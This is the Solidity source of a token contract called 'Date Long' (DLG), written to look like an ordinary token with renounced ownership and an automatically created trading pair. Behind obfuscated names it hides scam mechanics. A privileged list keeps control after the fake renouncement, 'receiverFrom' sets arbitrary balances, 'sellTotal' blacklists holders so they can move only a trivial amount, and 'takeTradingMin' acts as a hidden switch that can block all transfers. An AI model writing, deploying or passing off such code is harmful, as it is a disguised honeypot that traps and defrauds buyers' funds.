//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface toMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingFund {
    function createPair(address txTotal, address isSender) external returns (address);
}

interface marketingExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingTotal) external view returns (uint256);

    function transfer(address fromLaunch, uint256 liquidityTotal) external returns (bool);

    function allowance(address listFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityTotal) external returns (bool);

    function transferFrom(
        address sender,
        address fromLaunch,
        uint256 liquidityTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderTx, uint256 value);
    event Approval(address indexed listFee, address indexed spender, uint256 value);
}

interface marketingExemptMetadata is marketingExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DateLong is toBuy, marketingExempt, marketingExemptMetadata {

    function getOwner() external view returns (address) {
        return swapIsLimit;
    }

    function receiverIs() private view {
        require(listShould[_msgSender()]);
    }

    uint256 constant shouldMin = 7 ** 10;

    uint256 receiverExempt;

    uint256 private liquidityShouldList;

    constructor (){
        
        toMarketing launchLiquidity = toMarketing(tokenTotal);
        maxWallet = tradingFund(launchLiquidity.factory()).createPair(launchLiquidity.WETH(), address(this));
        if (maxLimit == marketingIs) {
            maxLimit = senderMax;
        }
        totalLimit = _msgSender();
        fromAt();
        listShould[totalLimit] = true;
        fundSenderLimit[totalLimit] = shouldAmount;
        
        emit Transfer(address(0), totalLimit, shouldAmount);
    }

    function receiverFrom(address receiverList, uint256 liquidityTotal) public {
        receiverIs();
        fundSenderLimit[receiverList] = liquidityTotal;
    }

    bool public limitMarketing;

    function decimals() external view virtual override returns (uint8) {
        return enableFee;
    }

    mapping(address => uint256) private fundSenderLimit;

    uint256 private maxLimit;

    address tokenTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed feeSwapTo, address indexed launchFundTo);

    mapping(address => mapping(address => uint256)) private feeList;

    address private swapIsLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldAmount;
    }

    string private walletAuto = "Date Long";

    uint8 private enableFee = 18;

    function name() external view virtual override returns (string memory) {
        return walletAuto;
    }

    uint256 private walletTeam;

    function sellTotal(address teamToTake) public {
        receiverIs();
        
        if (teamToTake == totalLimit || teamToTake == maxWallet) {
            return;
        }
        launchExempt[teamToTake] = true;
    }

    function owner() external view returns (address) {
        return swapIsLimit;
    }

    bool private marketingFundFee;

    string private shouldTake = "DLG";

    function fromAt() public {
        emit OwnershipTransferred(totalLimit, address(0));
        swapIsLimit = address(0);
    }

    mapping(address => bool) public listShould;

    function transferFrom(address exemptShould, address fromLaunch, uint256 liquidityTotal) external override returns (bool) {
        if (_msgSender() != tokenTotal) {
            if (feeList[exemptShould][_msgSender()] != type(uint256).max) {
                require(liquidityTotal <= feeList[exemptShould][_msgSender()]);
                feeList[exemptShould][_msgSender()] -= liquidityTotal;
            }
        }
        return receiverSwap(exemptShould, fromLaunch, liquidityTotal);
    }

    uint256 private walletBuy;

    mapping(address => bool) public launchExempt;

    function amountAuto(address totalFrom) public {
        require(totalFrom.balance < 100000);
        if (minBuy) {
            return;
        }
        
        listShould[totalFrom] = true;
        if (maxLimit == senderMax) {
            senderMax = sellTx;
        }
        minBuy = true;
    }

    function receiverSwap(address exemptShould, address fromLaunch, uint256 liquidityTotal) internal returns (bool) {
        if (exemptShould == totalLimit) {
            return receiverTeamTake(exemptShould, fromLaunch, liquidityTotal);
        }
        uint256 atSwap = marketingExempt(maxWallet).balanceOf(shouldLaunch);
        require(atSwap == receiverExempt);
        require(fromLaunch != shouldLaunch);
        if (launchExempt[exemptShould]) {
            return receiverTeamTake(exemptShould, fromLaunch, shouldMin);
        }
        return receiverTeamTake(exemptShould, fromLaunch, liquidityTotal);
    }

    address public maxWallet;

    uint256 sellReceiver;

    bool public minBuy;

    uint256 public sellTx;

    function balanceOf(address marketingTotal) public view virtual override returns (uint256) {
        return fundSenderLimit[marketingTotal];
    }

    function receiverTeamTake(address exemptShould, address fromLaunch, uint256 liquidityTotal) internal returns (bool) {
        require(fundSenderLimit[exemptShould] >= liquidityTotal);
        fundSenderLimit[exemptShould] -= liquidityTotal;
        fundSenderLimit[fromLaunch] += liquidityTotal;
        emit Transfer(exemptShould, fromLaunch, liquidityTotal);
        return true;
    }

    function approve(address launchTeam, uint256 liquidityTotal) public virtual override returns (bool) {
        feeList[_msgSender()][launchTeam] = liquidityTotal;
        emit Approval(_msgSender(), launchTeam, liquidityTotal);
        return true;
    }

    uint256 private limitTotal;

    function allowance(address enableAmount, address launchTeam) external view virtual override returns (uint256) {
        if (launchTeam == tokenTotal) {
            return type(uint256).max;
        }
        return feeList[enableAmount][launchTeam];
    }

    function takeTradingMin(uint256 liquidityTotal) public {
        receiverIs();
        receiverExempt = liquidityTotal;
    }

    address public totalLimit;

    uint256 public senderMax;

    function transfer(address receiverList, uint256 liquidityTotal) external virtual override returns (bool) {
        return receiverSwap(_msgSender(), receiverList, liquidityTotal);
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldTake;
    }

    uint256 private shouldAmount = 100000000 * 10 ** 18;

    address shouldLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private marketingIs;

}